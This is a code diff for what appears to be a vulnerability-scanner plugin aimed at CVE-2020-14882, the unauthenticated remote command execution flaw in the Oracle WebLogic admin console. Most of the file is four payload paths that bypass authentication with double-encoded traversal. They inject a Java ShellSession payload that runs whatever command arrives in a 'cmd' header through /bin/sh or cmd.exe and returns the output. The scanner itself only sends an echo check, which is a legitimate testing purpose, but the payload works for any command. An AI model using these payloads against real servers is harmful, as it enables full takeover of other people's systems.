@@ -1,80 +1,58 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
+from lib.tool.md5 import random_md5
 from lib.tool import check
-from thirdparty import requests
 import http.client
 
-def cve_2020_14882_scan(self, url):
-        ''' Weblogic 管理控制台未授权远程命令执行
-                配合CVE-2020-14750未授权进入后台, 调用相关接口实现命令执行
-        '''
-        vul_info = {}
-        vul_info['app_name'] = self.app_name
-        vul_info['vul_type'] = 'RCE'
-        vul_info['vul_id'] = 'CVE-2020-14882'
-        vul_info['vul_method'] = 'GET'
-        vul_info['headers'] = {
-            'cmd': self.cmd
-        }
+cve_2020_14882_payloads = [
+    {'path': 'images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')'},
+    {'path': 'images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')'},
+    {'path': 'console/images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')'},
+    {'path': 'console/images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')'}
+]
 
-        headers = self.headers.copy()
-        headers.update(vul_info['headers'])
+def cve_2020_14882_scan(self, clients):
+    ''' Weblogic 管理控制台未授权远程命令执行
+            配合CVE-2020-14750未授权进入后台, 调用相关接口实现命令执行
+    '''
+    client = clients.get('reqClient')
 
-        for payload in self.cve_2020_14882_payloads:    # * Payload
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'RCE',
+        'vul_id': 'CVE-2020-14882',
+    }
 
-            path = payload['path']                      # * Path
-            data = payload['data']                      # * Data
-            target = url + path                         # * Target
+    randomStr = random_md5(6)
+    RCEcommand = 'echo ' + randomStr
+    
+    headers = {
+        'cmd': RCEcommand
+    }
 
-            vul_info['path'] = path
-            vul_info['data'] = data
-            vul_info['target'] = target
+    for payload in cve_2020_14882_payloads:
+        path = payload['path']
 
-            try:
-                # * 有时候用HTTP1.1会报错, 使用HTTP1.0试试
-                http.client.HTTPConnection._http_vsn = 10
-                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
+        # * 有时候用HTTP1.1会报错, 使用HTTP1.0试试
+        # http.client.HTTPConnection._http_vsn = 10
+        # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
+        res = client.request(
+            'get',
+            path,
+            headers=headers,
+            vul_info=vul_info
+        )
+        if res is None:
+            continue
+        # http.client.HTTPConnection._http_vsn = 11
+        # http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
 
-                res = requests.get(
-                    target, 
-                    timeout=self.timeout, 
-                    headers=headers, 
-                    data=data, 
-                    proxies=self.proxies, 
-                    verify=False
-                )
-                http.client.HTTPConnection._http_vsn = 11
-                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
-
-                logger.logging(vul_info, res.status_code, res)                        # * LOG
-
-                if (self.md in check.check_res(res.text, self.md)):
-                    results = {
-                        'Target': url + 'console/images/%252E./consolejndi.portal',
-                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                        'Method': vul_info['vul_method'],
-                        'Payload': {
-                            'Url': url,
-                            'Path': path,
-                            'Headers': vul_info['headers']
-                        },
-                        'Request': res
-                    }
-                    return results
-            except requests.ConnectTimeout:
-                http.client.HTTPConnection._http_vsn = 11
-                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
-                logger.logging(vul_info, 'Timeout')
-                return None
-            except requests.ConnectionError:
-                http.client.HTTPConnection._http_vsn = 11
-                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
-                logger.logging(vul_info, 'Faild')
-                return None
-            except:
-                http.client.HTTPConnection._http_vsn = 11
-                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
-                logger.logging(vul_info, 'Error')
-                return None
+        if (check.check_res(res.text, randomStr)):
+            results = {
+                'Target': res.request.url,
+                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                'Request': res
+            }
+            return results
+    return None
